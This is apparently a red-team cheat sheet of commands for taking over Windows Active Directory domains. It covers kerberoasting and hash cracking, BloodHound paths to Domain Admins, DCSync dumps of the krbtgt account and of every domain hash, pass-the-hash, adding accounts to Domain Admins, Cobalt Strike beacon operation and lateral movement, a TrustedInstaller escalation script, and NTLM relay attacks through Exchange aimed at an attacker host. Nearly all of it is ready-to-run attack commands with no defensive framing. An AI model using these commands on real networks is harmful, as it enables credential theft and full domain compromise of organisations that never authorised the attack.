GhostPack Tools
  Seatbelt.exe system|user (Opsec Tool)
  SharpUp.exe (Privesc Tool)
  SharpDump.exe (LSASS MiniDump Tool)
  SharpView.exe (Network Enumeration)
    - Examples: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
  SharpHound.exe -c All, Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
  Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
    Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
    
Bloodhound/Neo4J
  # FIND SPN WITH DOMAIN ADMIN
  MATCH (u:User {hasspn: true})
  MATCH (G:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'})
  MATCH p = shortestPath ((u)-[*1..]->(g))
  RETURN u.name,LENGTH(P)
  ORDER BY LENGTH(p) ASC

  # FIND SPN ORDER BY ADMIN ACCESS
  MATCH (u: User {hasspn: true})
  OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
  OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
  WITH u,COLLECT(c1) + COLLECT(c2) AS tempVar
  UNWIND tempVar AS comps
  RETURN u.name,COUNT(DISTINCT(comps))
  ORDER BY COUNT(DISTINCT(comps)) DESC

Overpass the Hash
  dcsync fqdn domain\user (User must have DCSync rights in that domain)
  dcsync fqdn domain\krbtgt (golden ticket)
  dcsync fqdn (dump entire domain hashes)
  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt

CrackMapExec
  crackmapexec IP_Address -u username -p='password' (Test if you have access)
  crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
    - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
  crackmapexec IP -u username -H hash

Net Commands
  shell net user username /domain (query domain user)
  shell net user username password /domain /add (Add User)
  shell net group "Domain Admins" /domain
  shell net group "Domain Admins" username /add /domain
  
Cobalt
  note mynote (Give beacon a name)
  sleep 60 15 (60 second sleep with 15% jitter)
  make_token domain\user password
  rev2self
  pth (Will perform a Kerberos downgrade and could be detected)
  Powershell-Import /path/to/ps1 file
    - Get-GPPPassword
  Spawn x64 listener (Move out of Powershell); then kill old listener
  If admin you can inject into system process to become SYSTEM or another process
  Golden/Silver Tickets: https://github.com/bluscreenofjeff/AggressorScripts
  
  Connect MetaSploit to Cobalt Listener
    set lhost cobalt host
    set lport cobalt listener
    set prependmigrate true
    set disablepayloadhandler true

Lateral Movement
  make_token username password
  shell dir \\system\c$ (Check if admin)
  shell net use \\system\c$
  wmi system listener (tab complete listener)
  spawn x64 listener (New listerner that is not Powershell)
  unlink ip addr of attack system (from target; can tab complete)
  link ip addr of target system (from attack box; verify dual home IP addresses)
  exit original beacon
  verify no powershell is running
  
PrivEsc
  Schedule Tasks/Trusted Installer
    https://tyranidslair.blogspot.com/2019/09/the-art-of-becoming-trustedinstaller.html?m=1
      $a = New-ScheduledTaskAction -Execute notepad.exe
      Register-ScheduledTask -TaskName 'TestTask' -Action $a
      $svc = New-Object -ComObject 'Schedule.Service'
      $svc.Connect()
      $user = 'NT SERVICE\TrustedInstaller'
      $folder = $svc.GetFolder('\')
      $task = $folder.GetTask('TestTask')
      $task.RunEx($null, 0, 0, $user)
      
  PowerPriv - Get DCSync rights from any user with a mailbox
    Link: http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
    Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
    Compromised Beacon: Powershell-Import /path/powerPriv.ps1
    Compromised Beacon: socks 36529
    Compromised Beacon: rportfwd 80 127.0.0.1 80
    Kali: Verify /etc/proxychains.conf port matches socks above
    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (-attackerPort 8080)
    Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
    dcsync fqdn dom\user
   
  PrivExchange - Get DCSync rights from any user with a mailbox
    https://github.com/dirkjanm/privexchange
    ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
    ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
    python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
    
  Multi-Domain (Forrest) compromise usiing Sid History
    https://adsecurity.org/?p=1640
 
 Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
